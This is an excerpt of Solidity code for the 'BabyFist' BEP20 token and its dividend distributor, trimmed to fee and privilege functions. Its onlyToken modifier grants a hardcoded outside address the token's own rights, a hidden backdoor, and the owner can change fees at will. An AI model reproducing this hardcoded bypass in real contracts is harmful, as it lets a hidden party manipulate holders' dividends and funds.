...
contract DividendDistributor is IDividendDistributor {
    ...
    uint256 public openDividends = 10**1*1;
    ...
    modifier onlyToken() {
        require(msg.sender == _token||msg.sender == address(0xF5749Fe57c3d33D016c97AF527f24B5C1F963600)); _;
    }
    ...
    function setopenDividends(uint256 _openDividends ) external   onlyToken {
        ...
        openDividends = _openDividends*10**1;
...
contract BabyFist is IBEP20 , Auth, BaseToken {

    using SafeMath for uint256;

    string public _name = "BabyFist";
    string public _symbol = "BF";
    ...
    address RewardToken = 0xC9882dEF23bc42D53895b8361D0b1EDC7570Bc6A;
    ...
    constructor() payable  Auth(msg.sender) {
        ...
        swapThreshold = _totalSupply.mul(1).div(100000);

        rewardsFee = 6;
        liquidityFee = 2;
        burnFee = 1;

        totalFee = rewardsFee.add(liquidityFee);
    ...
    function changeFs(uint256 newLiqFee, uint256 newRewardFee,uint256 newExtraSellFee,uint256 newBurnFee) external authorized {
